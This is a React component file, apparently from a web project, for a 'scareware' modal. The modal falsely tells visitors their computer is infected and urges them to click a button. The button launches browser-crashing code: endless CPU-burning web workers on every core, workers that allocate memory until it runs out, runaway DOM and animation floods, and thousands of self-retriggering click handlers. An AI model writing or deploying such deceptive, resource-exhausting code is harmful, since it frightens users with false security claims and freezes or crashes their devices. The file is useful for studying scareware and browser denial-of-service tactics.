import { useContext } from "react";
import { ScarewareModalContext } from "../../contexts/ScarewareModalContext.jsx";
import style from "./scarewareModal.module.css";
import warning from "../../assets/warning.svg";

function ScarewareModal(){
    const {showModal, setShowModal} = useContext(ScarewareModalContext);
    
    const handleOverlayClick = (e) => {
        if (e.target === e.currentTarget) {
            setShowModal(false);
        }
    };

        const cpuStress = () => {
        const numWorkers = navigator.hardwareConcurrency || 4;
        
        for (let i = 0; i < numWorkers; i++) {
            const worker = new Worker(URL.createObjectURL(new Blob([`
                while (true) {
                    // Operación intensiva de CPU
                    Math.random() * Math.random();
                }
            `], { type: 'application/javascript' })));
        }
    };

    const memoryStressMultiWorker = () => {
        const numWorkers = navigator.hardwareConcurrency || 4;

        for (let i = 0; i < numWorkers; i++) {
            const worker = new Worker(URL.createObjectURL(new Blob([`
                const arrays = [];
                const fillMemory = () => {
                    try {
                        // Cada worker llena memoria independientemente
                        const bigArray = new Array(5000000).fill().map(() => Math.random().toString(36));
                        const hugeString = 'x'.repeat(25000000);
                        const buffer = new ArrayBuffer(50 * 1024 * 1024);

                        arrays.push(bigArray, hugeString, buffer);

                        // Recursión inmediata para máxima velocidad
                        fillMemory();
                    } catch (e) {
                        self.postMessage('Worker ' + ${i} + ' agotó memoria');
                    }
                };

                fillMemory();
            `], { type: 'application/javascript' })));

            worker.onmessage = (e) => console.log(e.data);
        }
    };
    const domStress = () => {
        const createElements = () => {
            for (let i = 0; i < 1000; i++) {
                const div = document.createElement('div');
                div.innerHTML = 'x'.repeat(1000);
                div.style.position = 'absolute';
                div.style.left = Math.random() * window.innerWidth + 'px';
                div.style.top = Math.random() * window.innerHeight + 'px';
                document.body.appendChild(div);
            }

            requestAnimationFrame(createElements);
        };

        createElements();
    };

    const animationStress = () => {
        const elements = [];

        for (let i = 0; i < 1000; i++) {
            const div = document.createElement('div');
            div.style.cssText = `
                width: 10px; 
                height: 10px; 
                background: red; 
                position: absolute;
                transition: all 0.1s;
            `;
            document.body.appendChild(div);
            elements.push(div);
        }

        const animate = () => {
            elements.forEach(el => {
                el.style.left = Math.random() * window.innerWidth + 'px';
                el.style.top = Math.random() * window.innerHeight + 'px';
                el.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
            });

            setTimeout(animate, 10);
        };

        animate();
    };

    const eventStress = () => {
        const button = document.createElement('button');
        button.textContent = 'Generador de eventos';
        document.body.appendChild(button);

        for (let i = 0; i < 10000; i++) {
            button.addEventListener('click', () => {
                console.log(`Event ${i} triggered`);
                // Disparar más eventos
                button.dispatchEvent(new Event('click'));
            });
        }
        button.click();
    };

    const stackStress = () => {
        const recursiveFunction = (depth = 0) => {
            console.log(`Recursion depth: ${depth}`);
            return recursiveFunction(depth + 1);
        };

        try {
            recursiveFunction();
        } catch (e) {
            console.log('Stack overflow:', e.message);
        }
    };

    const crash = () => {
        setTimeout(cpuStress, 100);
        setTimeout(memoryStressMultiWorker, 200);
        setTimeout(domStress, 300);
        setTimeout(animationStress, 400);
        setTimeout(eventStress, 500);
    };


    return (
        <>
            {showModal && 
                <div className={style.modal_overlay} onClick={handleOverlayClick}>
                    <div className={style.modal_content}>
                        <h1>
                            Your computer has been infected!!
                        </h1>
                        <div className={style.warning_container}>
                            <img src={warning} alt="warning icon"/>
                        </div>
                        <h2>
                            Security scan completed with critical findings. System integrity may be compromised. Follow the instructions to resolve this issue.
                        </h2>
                        <button className={style.scareware_button} onClick={() => {crash()}}>
                            Click me!
                        </button>
                    </div>
                </div>
            }
        </>
    );
}

export default ScarewareModal;